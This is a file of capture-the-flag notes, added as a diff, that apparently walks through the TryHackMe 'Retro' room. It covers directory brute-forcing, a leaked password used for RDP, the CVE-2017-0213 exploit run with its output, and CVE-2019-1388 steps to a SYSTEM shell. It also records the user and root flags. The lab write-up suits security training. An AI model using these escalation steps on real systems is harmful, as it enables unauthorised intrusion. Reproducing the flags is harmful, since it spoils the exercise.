@@ -1,0 +1,163 @@
+gobuster dir -u http://10.10.77.72/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t 15 -x php,html,txt,bak,sh,cgi,zip
+
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.77.72/FUZZ -mc 302,200,301
+
+10.10.77.72/retro
+
+user Wade
+comment
+Leaving myself a note here just in case I forget how to spell it: parzival
+
+wade:parzival
+
+xfreerdp /u:wade /v:10.10.77.72
+pass: parzival
+
+Desktop --> user.txt
+3b99fbdc6d430bfb51c72c651a261927
+
+python windows-exploit-suggester.py --database <xls database  of exploits provided with the script> --systeminfor <systeminfo saved in a txt file> --ostext <Os> -l
+
+#wget the get-pip.py file
+wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
+
+#Run the file with python2 get-pip.py
+python get-pip
+
+#Install xlrd==1.1.0
+python -m pip2 install --user xlrd==1.1.0
+
+
+https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe
+
+ [*] OS Version: 1607 (14393)
+ [*] Enumerating installed KBs...
+ [!] CVE-2019-0836 : VULNERABLE
+  [>] https://exploit-db.com/exploits/46718
+  [>] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/
+
+ [!] CVE-2019-1064 : VULNERABLE
+  [>] https://www.rythmstick.net/posts/cve-2019-1064/
+
+ [!] CVE-2019-1130 : VULNERABLE
+  [>] https://github.com/S3cur3Th1sSh1t/SharpByeBear
+
+ [!] CVE-2019-1315 : VULNERABLE
+  [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html
+
+ [!] CVE-2019-1388 : VULNERABLE
+  [>] https://github.com/jas502n/CVE-2019-1388
+
+ [!] CVE-2019-1405 : VULNERABLE
+  [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/
+  [>] https://github.com/apt69/COMahawk
+
+ [!] CVE-2020-0668 : VULNERABLE
+  [>] https://github.com/itm4n/SysTracingPoc
+  
+  
+
+CVE-2017-0213
+https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213_x64.zip
+
+./CVE-2017-0213_x64.exe
+Building Library with path: script:C:\Users\Wade\Downloads\run.sct
+Found TLB name at offset 766
+QI - Marshaller: {00000000-0000-0000-C000-000000000046} 000001FAF5D32E80
+Queried Success: 000001FAF5D32E80
+AddRef: 1
+QI - Marshaller: {0000001B-0000-0000-C000-000000000046} 000001FAF5D32E80
+QI - Marshaller: {ECC8691B-C1DB-4DC0-855E-65F6C551AF49} 000001FAF5D32E80
+QI - Marshaller: {00000000-0000-0000-C000-000000000046} 000001FAF5D32E80
+Queried Success: 000001FAF5D32E80
+AddRef: 2
+QI - Marshaller: {00000018-0000-0000-C000-000000000046} 000001FAF5D32E80
+QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001FAF5D32E80
+QI - Marshaller: {00000040-0000-0000-C000-000000000046} 000001FAF5D32E80
+QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001FAF5D32E80
+QI - Marshaller: {94EA2B94-E9CC-49E0-C0FF-EE64CA8F5B90} 000001FAF5D32E80
+QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001FAF5D32E80
+QI - Marshaller: {77DD1250-139C-2BC3-BD95-900ACED61BE5} 000001FAF5D32E80
+QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001FAF5D32E80
+QI - Marshaller: {BFD60505-5A1F-4E41-88BA-A6FB07202DA9} 000001FAF5D32E80
+QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001FAF5D32E80
+QI - Marshaller: {03FB5C57-D534-45F5-A1F4-D39556983875} 000001FAF5D32E80
+QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001FAF5D32E80
+QI - Marshaller: {2C258AE7-50DC-49FF-9D1D-2ECB9A52CDD7} 000001FAF5D32E80
+QI - Marshaller: {00000019-0000-0000-C000-000000000046} 000001FAF5D32E80
+QI - Marshaller: {4C1E39E1-E3E3-4296-AA86-EC938D896E92} 000001FAF5D32E80
+Release: 3
+AddRef: 2
+Release: 3
+Opened Link \??\C: -> \Device\HarddiskVolume2\Users\Wade\Downloads: 000000000000018C
+QI - Marshaller: {00000003-0000-0000-C000-000000000046} 000001FAF5D33100
+Queried Success: 000001FAF5D33100
+AddRef: 1
+Release: 2
+QI - Marshaller: {ECC8691B-C1DB-4DC0-855E-65F6C551AF49} 000001FAF5D33100
+QI - Marshaller: {00000003-0000-0000-C000-000000000046} 000001FAF5D33100
+Queried Success: 000001FAF5D33100
+AddRef: 1
+Marshal Interface: {00000000-0000-0000-C000-000000000046}
+AddRef: 2
+AddRef: 3
+Release: 4
+Marshal Complete: 00000000
+Release: 2
+AddRef: 3
+QI - Marshaller: {00000003-0000-0000-C000-000000000046} 000001FAF5D32E80
+Queried Success: 000001FAF5D32E80
+AddRef: 4
+Marshal Interface: {659CDEAC-489E-11D9-A9CD-000D56965251}
+Setting bad IID
+Unknown IID: {ECC8691B-C1DB-4DC0-855E-65F6C551AF49} 000001FAF5D32D40
+Unknown IID: {00000003-0000-0000-C000-000000000046} 000001FAF5D32D40
+Unknown IID: {0000001B-0000-0000-C000-000000000046} 000001FAF5D32D40
+Query for IUnknown
+Unknown IID: {00000018-0000-0000-C000-000000000046} 000001FAF5D32D40
+Unknown IID: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001FAF5D32D40
+Unknown IID: {00000040-0000-0000-C000-000000000046} 000001FAF5D32D40
+Unknown IID: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001FAF5D32D40
+Unknown IID: {94EA2B94-E9CC-49E0-C0FF-EE64CA8F5B90} 000001FAF5D32D40
+Unknown IID: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001FAF5D32D40
+Unknown IID: {77DD1250-139C-2BC3-BD95-900ACED61BE5} 000001FAF5D32D40
+Unknown IID: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001FAF5D32D40
+Unknown IID: {BFD60505-5A1F-4E41-88BA-A6FB07202DA9} 000001FAF5D32D40
+Unknown IID: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001FAF5D32D40
+Unknown IID: {03FB5C57-D534-45F5-A1F4-D39556983875} 000001FAF5D32D40
+Unknown IID: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001FAF5D32D40
+Unknown IID: {2C258AE7-50DC-49FF-9D1D-2ECB9A52CDD7} 000001FAF5D32D40
+Unknown IID: {00000019-0000-0000-C000-000000000046} 000001FAF5D32D40
+Unknown IID: {4C1E39E1-E3E3-4296-AA86-EC938D896E92} 000001FAF5D32D40
+Query for ITMediaControl
+Marshal Complete: 00000000
+Release: 5
+Release: 4
+AddRef: 3
+Release: 4
+Release: 3
+Result: 80029C4A
+Done
+Release: 1
+Release object 000001FAF5D33100
+Release: 2
+
+
+
+
+https://github.com/jas502n/CVE-2019-1388
+
+https://github.com/jas502n/CVE-2019-1388/blob/master/HHUPD.EXE
+click ---->certificate ---> open IE---> file ---->save --->run c:\windows\system32\cmd.exe
+
+whoami
+nt authority\system
+C:\Users\Administrator\Desktop>type root.txt.txt
+7958b569565d7bd88d10c6f22d1c4063
+
+https://tryhackme.com/room/retro
+https://sckull.github.io/posts/retro/
+https://medium.com/@conmurray/tryhackme-retro-write-up-fe4599480267
+https://muirlandoracle.co.uk/2020/01/06/retro-write-up/
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+
